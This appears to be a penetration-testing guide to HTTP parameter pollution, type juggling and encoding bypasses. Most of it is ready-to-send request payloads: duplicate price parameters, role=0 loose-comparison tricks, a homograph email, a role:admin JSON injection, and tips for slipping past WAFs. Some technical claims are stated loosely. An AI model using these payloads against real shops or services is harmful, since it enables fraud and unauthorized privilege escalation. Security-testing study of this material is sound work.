# HTTP Parameter Pollution / Type Juggling / Encoding Bypass

## When this applies

- Endpoint validates a parameter (`price`, `quantity`, `role`) but trusts the FIRST or LAST occurrence in a way that doesn't match the validator's view.
- Backend accepts mixed Content-Type, mixed query/body, or duplicate parameters.
- PHP / loose-typed languages where `"0" == 0`, `"admin" == 0`, `"1" == true`.

## Technique

Send the parameter twice (or in a different format) so the validator sees one value while the business logic sees another. Combine with type juggling to cause loose comparisons to flip.

## Steps

### Duplicate parameters

```http
# Test how application handles duplicate parameters

# Scenario 1: Uses first value
productId=1&price=1&price=133700
Result: price=1

# Scenario 2: Uses last value
productId=1&price=133700&price=1
Result: price=1

# Scenario 3: Uses both (array)
productId=1&price=1&price=133700
Result: price=[1, 133700] (depends on backend)

# Scenario 4: Concatenates
productId=1&price=1&price=337
Result: price="1337" (string concatenation)
```

### Array injection

```http
# Normal parameter
quantity=1

# Array format (may bypass validation)
quantity[]=1
quantity[0]=1
quantity[1]=2  # Multiple items?

# Nested arrays
quantity[0][0]=1

# Associative arrays
quantity[id]=1
quantity[amount]=100
```

### Parameter pollution in different contexts

```http
# Query string pollution
GET /cart?productId=1&price=1&price=133700 HTTP/1.1

# Body parameter pollution
POST /cart HTTP/1.1
Content-Type: application/x-www-form-urlencoded

productId=1&price=1&price=133700

# Mixed (query + body)
POST /cart?price=1 HTTP/1.1
Content-Type: application/x-www-form-urlencoded

productId=1&price=133700

# Cookie pollution
Cookie: price=1; price=133700

# Header pollution
X-Price: 1
X-Price: 133700
```

### URL encoding

```http
# Normal
price=1

# URL encoded
price=%31  # '1'
price=%30  # '0'

# Double URL encoded
price=%2531  # '%31'

# Mixed encoding
price=1%30  # '10' if concatenated
```

### Unicode encoding

```http
# Unicode variations
price=1  # '1'
price=%u0031  # '1' (IIS)

# Unicode normalization bypass
email=admin@company.com
email=аdmin@company.com  # Cyrillic 'а' (U+0430) instead of Latin 'a'
```

### Base64 encoding

```http
# If parameters are base64-encoded
# Original: productId=1&price=1
# Base64: cHJvZHVjdElkPTEmcHJpY2U9MQ==

# Modified: productId=1&price=133700
# Base64: cHJvZHVjdElkPTEmcHJpY2U9MTMzNzAw

# Test if validation occurs before or after decoding
```

### Type confusion

```http
# String vs Integer
quantity="1"  # String
quantity=1    # Integer

# Boolean
is_admin=true
is_admin=1
is_admin="true"

# Null/Undefined
price=null
price=undefined
price=""

# Array vs Scalar
price=1
price[]=1

# Object
price={"amount":1}
price=[object Object]
```

### Loose comparison exploitation

```php
// PHP loose comparison vulnerabilities
// "0" == 0  → true
// "1" == true → true
// "admin" == 0 → true (!)

// Payloads:
role=0  // May match "admin" in loose comparison
token=0  // May match any non-numeric token
```

### Content-Type confusion

```http
# Original: Form data
POST /api/cart HTTP/1.1
Content-Type: application/x-www-form-urlencoded

productId=1&price=1

# Try: JSON
POST /api/cart HTTP/1.1
Content-Type: application/json

{"productId":1,"price":1,"role":"admin"}

# Try: XML
POST /api/cart HTTP/1.1
Content-Type: application/xml

<cart><productId>1</productId><price>1</price></cart>

# Try: Multipart
POST /api/cart HTTP/1.1
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="productId"

1
------Boundary
Content-Disposition: form-data; name="price"

1
------Boundary--
```

## Verifying success

- The validator's reported value differs from the value used by business logic (e.g., validator sees `price=133700`, charge sees `price=1`).
- Type-juggling payloads (`role=0`) match privileged checks.
- Content-Type swap allows extra fields (`{"role":"admin"}`) that the form parser would have ignored.

## Common pitfalls

- HPP behavior is backend-specific: PHP last, ASP.NET concatenation (with comma), Tomcat first, Apache HTTPD first. Test both first/last by sending in both orders.
- Some WAFs normalize duplicates before forwarding — use mixed query/body to bypass.
- JSON-vs-form parsers may both succeed on the same endpoint (Spring) or only one — check for 400 vs 200 to detect.

## Tools

- Burp Suite Repeater (manual ordering)
- Burp Param Miner
- HTTPParameterPollutionScanner Burp extension
- curl with multiple `-d` flags
